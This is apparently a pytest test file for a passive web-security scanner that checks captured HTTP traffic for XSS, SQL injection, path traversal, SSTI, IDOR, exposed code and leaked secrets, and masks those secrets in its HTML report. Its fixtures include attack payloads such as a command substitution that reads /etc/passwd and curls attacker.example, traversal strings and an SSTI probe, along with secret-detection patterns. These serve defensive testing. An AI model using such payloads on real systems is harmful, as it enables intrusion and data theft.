    assert idor, "no IDOR candidate in a full run"
    assert idor[0].path == "/users/{int}", "the endpoint template is the path"
    assert "distinct" in idor[0].detail

    # ... and only on a full run: a single named check is just that check.
    _rows, only_sqli, _messages = report_html.collect(
        str(db), "requests", "sqli", False
    )
    assert not [f for f in only_sqli if f.check == "idor"]


def test_report_message_offsets_survive_astral_characters(tmp_path, make_db):
    """Offsets are UTF-16 units because that is what JS string slicing counts."""
    from cru import report_html

    db = tmp_path / "u.db"
    con = make_db(
        [dict(response_body='{"note":"\U0001f600","k":"AKIAIOSFODNN7EXAMPLE"}')]
    )
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    rows, findings, messages = report_html.collect(str(db), "requests", "secrets", True)
    doc = report_html.build_report_doc(rows, findings, {"db": str(db)}, messages)
    checked = 0
    for rec in doc["findings"]:
        if not rec["match"]:
            continue
        pane = doc["messages"][str(rec["row"])][rec["pane"]]
        units = pane.encode("utf-16-le")
        sliced = units[rec["match"][0] * 2 : rec["match"][1] * 2].decode("utf-16-le")
        assert sliced == report_html._needle(rec["evidence"])
        checked += 1
    assert checked, "no located finding to check the offsets of"
    # The emoji sits before the secret, so a byte- or codepoint-counted offset
    # lands somewhere else entirely.
    assert any(rec["match"] and rec["match"][0] > 0 for rec in doc["findings"])


def test_report_masks_every_occurrence_not_just_the_one_reported(tmp_path, make_db):
    """A re-issued token is one finding; both siblings sit in the panes."""
    from cru import report_html

    first = _jwt({"sub": "42", "role": "admin", "iat": 1})
    second = _jwt({"sub": "42", "role": "admin", "iat": 900})
    con = make_db(
        [
            dict(headers=f"Authorization: Bearer {first}"),
            dict(headers=f"Authorization: Bearer {second}"),
        ]
    )
    db = tmp_path / "g.db"
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    _rows, findings, messages = report_html.collect(
        str(db), "requests", "secrets", False
    )
    assert len([f for f in findings if f.signature == "jwt"]) == 1
    panes = "".join(t for row in messages["panes"].values() for t in row.values())
    assert first not in panes and second not in panes


def test_report_masks_a_secret_only_the_pane_spells_out(tmp_path, make_db):
    """The panes are the text being shown, so they are what the masking reads.

    A token carried URL-encoded reads one way in the reconstructed request and
    another in the decoded field the checks scan; masking from the fields left
    the pane's form of it in the clear.
    """
    from cru import report_html

    token = "isAjIhKtJ0RlgLKOmxgJ+TeKdNnFRIBXuDL7DxtpYlSXp"
    con = make_db([dict(query=f"tok={token}")])
    db = tmp_path / "e.db"
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    _rows, _findings, messages = report_html.collect(str(db), "requests", "all", False)
    panes = "".join(t for row in messages["panes"].values() for t in row.values())
    assert token not in panes
    assert "•" in panes


def test_report_masks_secrets_when_the_secrets_check_was_skipped(tmp_path, make_db):
    """Asking for fewer checks must not hand out more secrets.

    The panes embed whole bodies whatever ran, so `--skip secrets` used to
    produce a report with every token sitting in the clear.
    """
    from cru import report_html

    token = (
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ"
        ".dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
    )
    db = tmp_path / "s.db"
    con = make_db(
        [
            dict(
                headers=f"Authorization: Bearer {token}",
                response_body=f'{{"token":"{token}"}}',
            )
        ]
    )
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    _rows, _findings, messages = report_html.collect(
        str(db), "requests", "all", False, skip=("secrets",)
    )
    panes = "".join(t for row in messages["panes"].values() for t in row.values())
    assert token not in panes
    assert "•" in panes


def test_legacy_db_without_decoded_columns_still_scans():
    """Loader falls back gracefully when decoded columns are absent."""
    con = sqlite3.connect(":memory:")
    con.execute(
        "CREATE TABLE requests (host TEXT, method TEXT, path TEXT, "
        "query TEXT, cookies TEXT, headers TEXT, body TEXT, "
        "is_tls BOOLEAN, response_status_code INTEGER, "
        "response_headers TEXT, response_body TEXT)"
    )
    con.execute(
        "INSERT INTO requests (host,method,path,query,is_tls,"
        "response_status_code) VALUES "
        "('app.test','GET','/','q=<script>alert(1)</script>',1,200)"
    )
    con.commit()
    con.row_factory = sqlite3.Row
    rows = con.execute("SELECT * FROM requests").fetchall()
    findings = ps.build_checks("xss")[0].run(rows)
    assert "xss" in {f.check for f in findings}


def _jwt(claims, header=None):
    """Build a JWT-shaped token; the signature only has to look like one."""
    import base64
    import json as _json

    def seg(obj):
        raw = _json.dumps(obj, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(raw).decode().rstrip("=")

    head = seg(header or {"alg": "HS256", "typ": "JWT"})
    return f"{head}.{seg(claims)}.aaaaaaaabbbbbbbbcccccccc"


def test_jwt_findings_dedupe_on_decoded_content(run_check):
    """A re-issued token is one finding carrying every path it was seen on.

    Refreshing a session mints a new iat/exp and a new signature for the same
    credential, which used to leave one finding per request.
    """
    same_a = _jwt({"sub": "42", "role": "admin", "iat": 1, "exp": 2})
    same_b = _jwt({"sub": "42", "role": "admin", "iat": 900, "exp": 999})
    other = _jwt({"sub": "43", "role": "admin", "iat": 1, "exp": 2})
    rows = [
        dict(path="/a", headers=f"Authorization: Bearer {same_a}"),
        dict(path="/b", headers=f"Authorization: Bearer {same_b}"),
        dict(path="/c", headers=f"Authorization: Bearer {other}"),
    ]

    findings = run_check("jwt", rows)
    hmac = [f for f in findings if f.signature == "jwt:hmac-alg"]
    assert len(hmac) == 2, "one finding per distinct token, not per re-issue"
    merged = next(f for f in hmac if len(f.paths) > 1)
    # The method rides along: a merged finding spans requests, and a bare path
    # would implicate the OPTIONS preflight beside the GET that carried it.
    assert merged.paths == ["GET /a", "GET /b"]
    assert next(f for f in hmac if len(f.paths) == 1).paths == ["GET /c"]


def test_two_tokens_for_one_subject_are_told_apart(run_check):
    """An access token and its refresh token share their first 60 characters.

    Same header, same opening claim, so the evidence snippet is identical and
    two findings read as one reported twice. What separates them has to be on
    the finding.
    """
    rows = [
        dict(cookies=f"a={_jwt({'username': '42', 'type': 'access', 'exp': 1})}"),
        dict(cookies=f"r={_jwt({'username': '42', 'type': 'refresh', 'exp': 2})}"),
    ]

    findings = [f for f in run_check("jwt", rows) if f.signature == "jwt:hmac-alg"]

    assert len(findings) == 2, "two credentials"
    assert (
        len({f.evidence for f in findings}) == 1
    ), "the snippet cannot tell them apart"
    assert len({f.detail for f in findings}) == 2, "so the detail must"
    assert any("type=refresh" in f.detail for f in findings)


def test_reissued_oidc_tokens_are_one_credential(run_check):
    """Google mints a fresh `at_hash` per refresh and changes nothing else.

    `at_hash` is a digest of what else came out of that exchange, not part of
    who the token is for, so three sightings of one subject's ID token were
    three findings until it counted as volatile.
    """
    rows = [
        dict(
            method="POST",
            path=f"/cb{i}",
            body=_jwt(
                {
                    "iss": "accounts.google.com",
                    "sub": "42",
                    "email": "t@example.com",
                    "at_hash": h,
                    "iat": i,
                    "exp": 100 + i,
                }
            ),
        )
        for i, h in enumerate(["JD2nS5zL3Imr", "NmtJJtzhjWp_", "mf6lUXVKzPkW"])
    ]

    tokens = [f for f in run_check("secrets", rows) if f.signature == "jwt"]

    assert len(tokens) == 1, "a re-issued ID token is one credential"
    assert len(tokens[0].paths) == 3


def test_an_access_token_is_not_its_refresh_token(run_check):
    """What is *not* volatile matters too: those are different credentials."""
    rows = [
        dict(method="POST", path="/a", body=_jwt({"username": "42", "type": "access"})),
        dict(
            method="POST", path="/b", body=_jwt({"username": "42", "type": "refresh"})
        ),
    ]

    assert len([f for f in run_check("secrets", rows) if f.signature == "jwt"]) == 2


def test_secrets_jwt_detector_dedupes_the_same_way(run_check):
    """The `jwt` detector in the secrets check groups on content too."""
    same_a = _jwt({"sub": "42", "iat": 1, "exp": 2})
    same_b = _jwt({"sub": "42", "iat": 900, "exp": 999})
    rows = [
        dict(path="/a", body=same_a),
        dict(path="/b", body=same_b),
    ]

    tokens = [f for f in run_check("secrets", rows) if f.signature == "jwt"]
    assert len(tokens) == 1
    assert tokens[0].paths == ["GET /a", "GET /b"]


def test_code_sees_python_inside_a_json_string(run_check):
    """Escaped newlines glue each line to the last, so \\b never fires.

    `{"src": "...Operation\\ndef operation(a):..."}` reads as `ndef operation(`
    in the raw field. The per-parameter view has the value unescaped, which is
    where code in an API body actually shows.
    """
    body = json.dumps(
        {"node": {"src": "# a comment\ndef operation(a, b):\n    return a"}}
    )
    rows = [dict(method="POST", body=body)]

    findings = run_check("code", rows)

    python = [f for f in findings if f.signature == "code:python (syntax)"]
    assert python, "Python in a JSON string went unseen"
    assert "def operation(" in python[0].evidence


@pytest.mark.parametrize(
    "snippet,signature",
    [
        ("# a note\ndef operation(a, b):\n    return a", "code:python (syntax)"),
        ("<?php\n$x = 1;\nsystem($cmd);\n?>", "code:generic-eval-exec-sink (exec)"),
        ("function f(){\n  require('child_process');\n}", "code:javascript (exec)"),
        ("#!/bin/sh\ncat /etc/passwd\n", "code:shell (exec)"),
        # Beyond function definitions: what a program does line to line.
        ("value = 2\nprint(value)\n", "code:python (syntax)"),
        ("class Thing:\n    def go(self):\n        return 1\n", "code:python (syntax)"),
        ("const total = 1;\nconsole.log(total);\n", "code:javascript (syntax)"),
        ("function f(){\n  return 1;\n}\n", "code:javascript (syntax)"),
        ("<?php\necho $name;\n", "code:php (syntax)"),
        ("def go\n  puts 'hi'\nend\n", "code:ruby (syntax)"),
        (
            "public class A {\n  System.out.println(1);\n}",
            "code:java-ognl (syntax)",
        ),
        ("param([string]$x)\nWrite-Host $x\n", "code:powershell (syntax)"),
        ("#!/bin/sh\nexport A=1\n", "code:shell (syntax)"),
    ],
)
def test_code_in_a_json_string_is_seen_whatever_the_language(
    snippet, signature, run_check
):
    """The seam is shared, so the unescaping is not a Python-only favour."""
    rows = [dict(method="POST", body=json.dumps({"src": snippet}))]

    assert signature in {f.signature for f in run_check("code", rows)}


def test_one_finding_per_rule_listing_where_it_fired(run_check):
    """A rule reaching a snippet through two views is one finding, not two.

    Rules stay apart, though: shell and PHP in the same body are different
    leads, so they are never folded together.
    """
    body = json.dumps({"src": '#!/bin/sh\nexport A=1\necho "$A"\n'})
    rows = [dict(method="POST", body=body)]

    findings = run_check("code", rows)

    by_sig = {f.signature: f for f in findings}
    assert len(by_sig) == len(findings), "a rule was reported more than once"
    shell = by_sig["code:shell (syntax)"]
    assert len(shell.rules) > 1, "the places it matched are listed on it"
    assert any("#json" in r for r in shell.rules)


def test_json_view_does_not_double_report(run_check):
    """The view re-presents a field it shares text with; a hit in both is one."""
    body = json.dumps({"note": "line\nline", "k": "AKIAIOSFODNN7EXAMPLE"})
    rows = [dict(method="POST", body=body, response_body=body)]

    keys = [f for f in run_check("secrets", rows) if f.signature == "aws-access-key-id"]

    assert len(keys) == 2, "one per field, not one per view"
    assert {f.location for f in keys} == {"request-body", "response-body"}


def test_code_does_not_read_markdown_backticks_as_a_shell_command(run_check):
    """A word in backticks is prose; `cat /etc/passwd` is not."""
    prose = json.dumps({"doc": "A function must be named `operation`."})
    assert not [
        f
        for f in run_check("code", [dict(method="POST", body=prose)])
        if f.signature == "code:shell (exec)"
    ]

    real = json.dumps({"x": "value=`cat /etc/passwd`"})
    assert [
        f
        for f in run_check("code", [dict(method="POST", body=real)])
        if f.signature == "code:shell (exec)"
    ]


def test_entropy_ignores_what_lives_inside_a_jwt(run_check):
    """A JWT is high-entropy by construction; the jwt detector already has it.

    Both forms have to be skipped: the raw token, and the expanded
    `{header}.{claims}.{signature}` view the decoder writes beside it.
    """
    token = _jwt({"sub": "42", "secret_looking_claim": "Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5"})
    rows = [dict(body=f"token={token}")]

    findings = run_check("secrets", rows)

    entropy = [f for f in findings if f.signature == "high-entropy-string"]
    assert not entropy, f"entropy reported JWT innards: {[f.evidence for f in entropy]}"
    assert any(f.signature == "jwt" for f in findings), "the token itself is a finding"


def test_entropy_leaves_alone_what_a_detector_already_named(run_check):
    """The sweep is for the *unlabelled*.

    A Basic credential is high-entropy by nature and is already a
    basic-auth-header finding; reporting the same bytes again is noise.
    """
    credential = "dXNlcjpwYXNzd29yZDEyMzQ1Njc4OTBhYmNkZWY="
    rows = [dict(headers=f"Authorization: Basic {credential}")]

    findings = run_check("secrets", rows)

    assert any(f.signature == "basic-auth-header" for f in findings)
    assert not [
        f
        for f in findings
        if f.signature == "high-entropy-string" and credential in f.evidence
    ]


def test_entropy_still_reports_a_secret_beside_a_jwt(run_check):
    """Skipping the token's span must not skip the rest of the field."""
    token = _jwt({"sub": "42"})
    loose = "Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5YWJjZGVm"
    rows = [dict(body=f"token={token}&other={loose}")]

    findings = run_check("secrets", rows)

    assert any(
        f.signature == "high-entropy-string" and loose in f.evidence for f in findings
    )


def test_a_jwt_in_a_basic_credential_is_one_finding(run_check):
    """This app sends its JWT as the Basic username.

    That is one credential in two encodings, so it is one secrets finding —
    reported as the header, which says what is inside it. Reporting the token
    separately looked like a mislabel: the request on screen says
    `Authorization: Basic`, with nothing to connect the two.
    """
    token = _jwt({"sub": "42"})
    header = "Authorization: Basic " + _b64.b64encode(f"{token}:".encode()).decode()
    rows = [dict(headers=header)]

    findings = run_check("secrets", rows)

    basic = [f for f in findings if f.signature == "basic-auth-header"]
    assert len(basic) == 1
    assert "JWT used as the username" in basic[0].detail
    assert not [f for f in findings if f.signature == "jwt"], "reported twice"


def test_a_jwt_on_its_own_is_still_a_secrets_finding(run_check):
    """The fold-in is for the Basic case only."""
    rows = [dict(method="POST", body=f"token={_jwt({'sub': '42'})}")]

    assert [f.signature for f in run_check("secrets", rows) if f.signature == "jwt"]


def test_one_secret_is_one_finding_however_many_requests(run_check):
    """A credential sprayed across a session is one thing to rotate."""
    rows = [
        dict(path="/a", response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}'),
        dict(path="/b", response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}'),
        dict(path="/c", response_body='{"k":"AKIAI44QH8DHBEXAMPLE"}'),
    ]

    keys = [f for f in run_check("secrets", rows) if f.signature == "aws-access-key-id"]

    assert len(keys) == 2, "one per distinct key, not one per request"
    merged = next(f for f in keys if len(f.paths) > 1)
    assert merged.paths == ["GET /a", "GET /b"]


def test_reflection_is_only_exploitable_when_it_comes_back_unencoded(run_check):
    """Encoding is the fix, so a reflected-and-encoded payload is not the bug.

    The payload is still worth noting as an input the app takes, but calling it
    exploitable when the app escaped it is how a scanner earns its reputation.
    """
    payload = "<script>alert(1)</script>"
    encoded = "&lt;script&gt;alert(1)&lt;/script&gt;"

    unencoded_run = run_check(
        "xss", [dict(query=f"q={payload}", response_body=f"echo {payload}")]
    )
    encoded_run = run_check(
        "xss", [dict(query=f"q={payload}", response_body=f"echo {encoded}")]
    )

    assert any("reflected" in f.signature for f in unencoded_run)
    assert not [f for f in encoded_run if "reflected" in f.signature], [
        f.signature for f in encoded_run
    ]
    # ... the payload itself is still reported, at review.
    assert any(f.signature.startswith("xss-payload:") for f in encoded_run)


def test_traversal_escalates_when_the_file_comes_back(run_check):
    """A `../` in an input is a guess; `root:x:0:0:` in the response is not.

    The pair is what makes it worth acting on, so the finding has to say the
    response confirmed it.
    """
    payload = "f=../../../../etc/passwd"
    guess = run_check("traversal", [dict(query=payload)])
    confirmed = run_check(
        "traversal",
        [dict(query=payload, response_body="root:x:0:0:root:/root:/bin/bash")],
    )

    assert guess and "file contents" not in guess[0].detail
    assert confirmed and "file contents returned" in confirmed[0].detail


def test_ssti_escalates_on_a_dangerous_token_inside_the_braces(run_check):
    """`{{7*7}}` is a template; `{{config...}}` is someone reaching for RCE."""
    plain = run_check("ssti", [dict(query="q={{7*7}}")])
    dangerous = run_check(
        "ssti", [dict(query="q={{config.__class__.__init__.__globals__}}")]
    )

    assert plain and "review for SSTI" in plain[0].detail
    assert dangerous and "SSTI-sensitive token 'config'" in dangerous[0].detail


def test_a_hit_visible_in_both_the_field_and_its_json_view_is_one_finding(run_check):
    """`#json` re-presents text it shares with the field it came from.

    The check that groups its findings would collapse them anyway; this is the
    one that does not, so `key()` has to drop the suffix itself.
    """
    body = json.dumps({"note": "line\nline", "q": "<script>alert(1)</script>"})

    findings = run_check("xss", [dict(method="POST", body=body)])

    script = [f for f in findings if f.signature == "xss-payload:script-tag"]
    assert len(script) == 1, [f.location for f in script]
    assert script[0].location == "request-body", "reported against the field"


def test_evidence_that_looks_like_markup_cannot_break_out_of_the_script_block():
    """The report embeds its data as JSON inside <script>; `</script>` in a
    finding would end the block and turn attacker text into markup.
    """
    from cru import report_html

    doc = {"findings": [{"evidence": "</script><img src=x onerror=alert(1)>"}]}

    embedded = report_html._safe_json(doc)

    assert "<" not in embedded and ">" not in embedded and "&" not in embedded
    assert "\\u003c" in embedded
    # ... and it is still the same document once the browser parses it.
    assert json.loads(embedded)["findings"][0]["evidence"].startswith("</script>")


def test_ungrouped_findings_still_dedupe_per_path(run_check):
    """A check that does not group keeps path-level dedup."""
    payload = "<script>alert(1)</script>"
    rows = [
        dict(path="/a", query=f"q={payload}", response_body=payload),
        dict(path="/b", query=f"q={payload}", response_body=payload),
    ]

    findings = [f for f in run_check("xss", rows) if f.check == "xss"]

    assert {tuple(f.paths) for f in findings} == {("GET /a",), ("GET /b",)}


def test_progress_covers_a_longer_line_it_overwrites(monkeypatch, capsys):
    """`\\r` returns to column 0 but erases nothing.

    A short label after a long one used to leave the tail of the long one on
    screen: `scanning (mixedcontent)` then `scanning (xss)` read as
    `scanning (xss)...ntent)`.
    """
    from cru import progress

    monkeypatch.setattr(progress, "_live", lambda: True)
    progress.clear()

    progress.track(1, 2, "scanning (mixedcontent)")
    progress.track(2, 2, "scanning (xss)")
    progress.clear()

    frames = capsys.readouterr().err.split("\r")
    assert "mixedcontent" not in frames[-2], frames[-2]
    assert frames[-1].strip() == "", "the line is not left on screen"


def test_progress_bar_fills_as_the_run_goes(monkeypatch, capsys):
    """The bar is the only sign of life on a long scan; it has to move."""
    from cru import progress

    monkeypatch.setattr(progress, "_live", lambda: True)
    progress.track(0, 4, "scanning")
    progress.track(3, 4, "scanning")
    progress.clear()

    start, most, _ = capsys.readouterr().err.split("\r")[1:4]
    assert "0/4 (  0%)" in start and start.count("#") == 0
    assert "3/4 ( 75%)" in most
    assert most.count("#") > start.count("#")


def test_progress_is_silent_without_a_terminal(capsys):
    """`--json > findings.json` must not collect a thousand carriage returns."""
    from cru import progress

    progress.track(1, 10, "scanning")
    progress.count(100, "reading export")
    progress.clear()

    captured = capsys.readouterr()
    assert captured.err == ""
    assert captured.out == ""


# --------------------------------------------------------------------------- #
# Runner surface: selection, output, loading
# --------------------------------------------------------------------------- #


def test_skip_leaves_the_named_checks_out_of_the_run():
    """`--check all --skip secrets` is a full run minus one, not a single check."""
    names = [c.name for c in ps.build_checks("all", skip=("secrets", "cors"))]

    assert "secrets" not in names and "cors" not in names
    assert set(names) == set(ALL_CHECKS) - {"secrets", "cors"}
    # Skipping something a single --check did not select changes nothing.
    assert [c.name for c in ps.build_checks("sqli", skip=("secrets",))] == ["sqli"]


def _idor_db(tmp_path, make_db):
    con = make_db(
        [
            dict(path=f"/users/{i}", headers="Authorization: Bearer abc")
            for i in range(1, 4)
        ]
    )
    db = tmp_path / "idor.db"
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()
    return db


def test_the_terminal_scan_reports_idor_candidates(tmp_path, make_db, capsys):
    """The report folded IDOR in and the scan did not, so the same corpus gave
    two different answers depending on which command you ran.
    """
    db = _idor_db(tmp_path, make_db)

    ps.main([str(db), "--no-progress"])

    out = capsys.readouterr().out
    assert "== idor :" in out
    assert "/users/{int}" in out, "the endpoint template is the finding's path"


def test_idor_can_be_skipped_or_asked_for_on_its_own(tmp_path, make_db, capsys):
    """It selects like a check even though it is not one."""
    db = _idor_db(tmp_path, make_db)

    ps.main([str(db), "--skip", "idor", "--no-progress"])
    assert "idor" not in capsys.readouterr().out

    ps.main([str(db), "--check", "idor", "--no-progress"])
    only = capsys.readouterr().out
    assert "== idor :" in only
    assert only.count("== ") == 1, "a single --check is just that check"
    assert ps.build_checks("idor") == [], "idor names no registered check"


def test_the_scan_and_the_report_agree_about_idor(tmp_path, make_db):
    """Same corpus, same candidates, whichever command produced them."""
    from cru import report_html

    db = _idor_db(tmp_path, make_db)

    rows = ps.load_rows(str(db))
    scanned = ps.idor_findings(str(db), "requests")
    _rows, reported, _messages = report_html.collect(str(db), "requests", "all", False)

    assert scanned, "no candidates to compare"
    assert [f.signature for f in scanned] == [
        f.signature for f in reported if f.check == "idor"
    ]
    assert not any(
        c.name == "idor" for c in ps.build_checks("all")
    ), "idor is a separate aggregation, not a registered check"
    assert rows, "the corpus still loads for the checks themselves"


def test_present_redacts_the_secrets_check_and_nothing_else(run_check):
    """Other checks quote payloads, and a redacted payload is unreadable."""
    key = "AKIAIOSFODNN7EXAMPLE"
    secrets = run_check("secrets", [dict(response_body=f'{{"k":"{key}"}}')])
    payload = run_check("sqli", [dict(query="q=x' UNION SELECT a,b FROM users--")])

    presented = ps._present(secrets + payload, show_secrets=False)

    assert all(key not in f.evidence for f in presented if f.check == "secrets")
    assert any("UNION SELECT" in f.evidence for f in presented if f.check == "sqli")


def test_render_text_shows_the_paths_and_rules_behind_a_finding(run_check):
    """A merged finding stands for several requests; the terminal has to say so."""
    rows = [
        dict(path="/a", response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}'),
        dict(path="/b", response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}'),
    ]
    findings = [
        f for f in run_check("secrets", rows) if f.signature == "aws-access-key-id"
    ]

    out = ps.render_text(findings)

    assert "== secrets : 1 finding(s) ==" in out
    assert "aws-access-key-id" in out
    assert "paths : 2" in out and "GET /a" in out and "GET /b" in out
    assert ps.render_text([]) == "No findings."


def test_load_rows_reads_a_named_table_without_decoded_columns(tmp_path):
    """A corpus built by another tool has neither the columns nor the name."""
    db = tmp_path / "legacy.db"
    con = sqlite3.connect(str(db))
    con.execute(
        "CREATE TABLE history (host TEXT, method TEXT, path TEXT, query TEXT,"
        " cookies TEXT, headers TEXT, body TEXT, is_tls BOOLEAN,"
        " response_status_code INTEGER, response_headers TEXT, response_body TEXT)"
    )
    con.execute(
        "INSERT INTO history VALUES ('app.test','GET','/','q=<script>alert(1)</script>',"
        "'','','',1,200,'','')"
    )
    con.commit()
    con.close()

    rows = ps.load_rows(str(db), "history")

    assert len(rows) == 1 and rows[0]["host"] == "app.test"
    assert "xss" in checks_of(ps.build_checks("xss")[0].run(rows))


def test_entry_point_imports_a_burp_export(tmp_path):
    """`python -m cru history.xml` has to take the XML path too."""
    import cru.__main__ as entry

    xml = tmp_path / "h.xml"
    xml.write_text(_burp_xml([("GET", "/a", "", "HTTP/1.1 200 OK\r\n\r\nok")]))

    db = entry.build_db(xml, None)

    assert db == xml.with_suffix(".db")
    assert len(ps.load_rows(str(db))) == 1


# --------------------------------------------------------------------------- #
# Bounds: the caps that keep one enormous field from costing the whole run
# --------------------------------------------------------------------------- #


def test_a_field_is_only_scanned_to_its_cap(run_check):
    """`_MAX_FIELD` is what stops one 50MB response from owning the scan."""
    from cru.checks.base import _MAX_FIELD

    payload = "<?php system(1); ?>"
    rows = [dict(method="POST", body="x" * (_MAX_FIELD + 10) + payload)]

    assert run_check("code", rows) == []
    assert run_check("code", [dict(method="POST", body=payload + "x" * 100)])


def test_the_decoded_view_is_bounded_per_field():
    """A response can carry a great many tokens; the expansion is capped."""
    tokens = " ".join(_jwt({"sub": str(i)}) for i in range(field_decode._MAX_JWTS + 20))

    view = field_decode.decoded_view(tokens)

    # The expansion writes its dictionaries with `json.dumps` spacing, which
    # is what tells an expanded token from the raw header the b64 pass decoded.
    assert view.count('{"alg": "HS256"') == field_decode._MAX_JWTS
    assert (
        len(field_decode.decoded_view("x" * 10 + b64("A" * 10_000)))
        <= field_decode._MAX
    )


def test_a_secret_quoted_in_a_finding_detail_is_masked(tmp_path, make_db):
    """A JWT's claims go on the finding so two tokens can be told apart.

    A claim can hold a credential, and the detail is rendered like any other
    field — masking the panes and leaving the detail alone just moves the leak.
    """
    from cru import report_html

    key = "AKIAIOSFODNN7EXAMPLE"
    token = _jwt({"sub": "42", "api_key": key})
    con = make_db([dict(headers=f"Authorization: Bearer {token}")])
    db = tmp_path / "detail.db"
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    _rows, findings, messages = report_html.collect(str(db), "requests", "jwt", False)
    doc = report_html.build_report_doc(_rows, findings, {"db": str(db)}, messages)

    assert any(
        "api_key" in f.detail for f in findings
    ), "the claims are what the detail is for"
    assert key not in json.dumps(doc), "a credential escaped through a detail"


def test_host_level_findings_are_reported_once_per_host(run_check):
    """A missing header is a property of the host, not of every URL on it.

    Keeping the path would turn one configuration fault into one finding per
    request, which is the whole reason those checks blank it before dedup.
    """
    rows = [
        dict(
            path=f"/p{i}", response_headers="Content-Type: text/html", response_body="x"
        )
        for i in range(5)
    ]

    findings = run_check("security-headers", rows)

    assert findings, "no header findings to collapse"
    assert all(f.path == "" for f in findings)
    csp = [f for f in findings if f.signature == "missing-csp"]
    assert len(csp) == 1, "one host, one missing-CSP finding"


def test_a_finding_points_at_a_request_on_its_own_path(tmp_path, make_db):
    """The same evidence can sit on many requests; the finding names one."""
    from cru import report_html

    payload = "<script>alert(1)</script>"
    con = make_db(
        [
            dict(path="/first", query=f"q={payload}", response_body=payload),
            dict(path="/second", query=f"q={payload}", response_body=payload),
        ]
    )
    db = tmp_path / "loc.db"
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    _rows, findings, messages = report_html.collect(str(db), "requests", "xss", False)

    for finding, (row, _pane, _match) in zip(findings, messages["locations"]):
        if finding.path:
            assert _rows[row]["path"] == finding.path, (
                f"{finding.signature} on {finding.path} points at "
                f"{_rows[row]['path']}"
            )


def test_a_report_pane_is_capped(tmp_path, make_db):
    """The report embeds whole bodies; without a cap one row is the report."""
    from cru import report_html

    over = report_html._PANE_CAP + 5000
    con = make_db([dict(method="POST", body="y" * over, response_body="z" * over)])
    db = tmp_path / "big.db"
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    _rows, _findings, messages = report_html.collect(str(db), "requests", "xss", False)

    panes = messages["panes"][0]
    assert len(panes["request"]) == report_html._PANE_CAP
    assert len(panes["response"]) == report_html._PANE_CAP


def test_evidence_truncated_by_the_snippet_still_locates_in_the_pane(tmp_path, make_db):
    """`_snippet` cuts evidence at 60 characters and marks the cut with an
    ellipsis. That ellipsis is not in the message, so looking for the evidence
    verbatim finds nothing and the finding loses its highlight.
    """
    from cru import report_html

    command = "$(cat /etc/passwd && curl http://attacker.example/very/long/path?d=1)"
    con = make_db([dict(method="POST", body=f"cmd={command}")])
    db = tmp_path / "snip.db"
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    _rows, findings, messages = report_html.collect(str(db), "requests", "code", False)
    shell = next(f for f in findings if f.signature == "code:shell (exec)")
    assert shell.evidence.endswith("…"), "the case only exists for cut evidence"
    assert len(shell.evidence) == 61

    row, pane, match = messages["locations"][findings.index(shell)]
    assert match, "truncated evidence was not located in its own message"
    located = messages["panes"][row][pane][match[0] : match[1]]
    assert located == shell.evidence.removesuffix("…")
    assert command.startswith(located)


def test_jwt_identity_ignores_the_claims_that_change_per_issue():
    """Two tokens differing only in when they were minted are one credential."""
    from cru.checks.base import jwt_identity

    base_claims = {"sub": "42", "role": "admin"}
    volatile = dict(base_claims, iat=1, exp=2, nbf=0, jti="a", auth_time=5, nonce="n")
    again = dict(
        base_claims, iat=900, exp=901, nbf=899, jti="b", auth_time=8, nonce="m"
    )

    assert jwt_identity(_jwt(volatile)) == jwt_identity(_jwt(again))
    assert jwt_identity(_jwt(dict(base_claims, sub="43"))) != jwt_identity(
        _jwt(base_claims)
    )
    assert jwt_identity("not.a.jwt") is None


# --------------------------------------------------------------------------- #
# Pattern gating and binary responses
# --------------------------------------------------------------------------- #


def test_gate_skips_the_pattern_when_its_literal_is_absent():
    """The gate is the whole speed-up: no literal, no regex pass."""
    from cru.checks.base import gate

    rx = gate(r"\bAKIA[0-9A-Z]{16}\b", "akia")
    assert rx.search("nothing here") is None
    assert rx.search("AKIAABCDEFGHIJKLMNOP") is not None


def test_gate_literals_are_matched_whatever_the_case():
    """The literals are the gate; a case-sensitive one would hide findings.

    They are written lowercase, and the text is not: `AKIA...` has to reach the
    pattern that names `akia`.
    """
    from cru.checks.base import gate

    rx = gate(r"\bAKIA[0-9A-Z]{16}\b", "akia")
    assert rx.search("key=AKIAABCDEFGHIJKLMNOP") is not None
    # The gate really is doing the skipping, not the pattern.
    assert rx._target("no key here")[0] is None
    assert rx._target("key=AKIAABCDEFGHIJKLMNOP")[0] is not None


def test_gate_matches_case_insensitively_and_keeps_the_original_case():
    """A folded pattern must still hand back evidence as it was written."""
    from cru.checks.base import gate

    rx = gate(r"(?i)secret:\s*(\w+)", "secret")
    m = rx.search("Header\nSECRET: HunTer2\n")
    assert m.group(0) == "SECRET: HunTer2"
    assert m.group(1) == "HunTer2"
    assert m.groups() == ("HunTer2",)


def test_gate_keeps_the_flag_when_the_pattern_carries_uppercase():
    """`MySQL` folded against lowercase text would match nothing."""
    from cru.checks.base import gate

    rx = gate(r"(?i)valid MySQL result", "mysql")
    assert rx.search("valid mysql result") is not None
    assert rx.search("VALID MYSQL RESULT") is not None


def test_binary_response_bodies_are_not_scanned(run_check):
    """A font's bytes decode to noise; no check should pay to read it."""
    body = "AKIAABCDEFGHIJKLMNOP"
    row = dict(response_headers="Content-Type: font/woff2", response_body=body)
    assert run_check("secrets", [row]) == []

    row["response_headers"] = "Content-Type: image/svg+xml"
    assert run_check("secrets", [row]), "SVG is text, and still scans"
